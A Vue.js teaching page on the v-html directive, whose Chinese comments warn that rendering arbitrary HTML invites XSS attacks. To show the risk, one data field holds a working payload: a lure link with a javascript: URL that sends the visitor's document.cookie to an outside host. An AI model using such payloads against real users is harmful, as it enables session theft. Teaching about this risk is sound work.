<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        1.作用：向指定节点中渲染包含html结构的内容
        2.于插值语法区别
            v-html会替换节点中所有的内容，{{}}不会
            v-html可识别henml结构
        3.严重注意：v-html有安全性问题
            在网站上动态渲染任意html是非常危险的，容易导致XSS攻击
            一定在可信的内容中用，用不要用在用户提交内容上

     -->
    <div id="root">
        <div>你好，{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
     </div>
</body>


<script>
    new Vue({
        el:'#root',
        data:{
            name:'lsb',
            str:'<h3>你好啊！</h3>',
            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来!</a>'
        }
    })
</script>
</html>
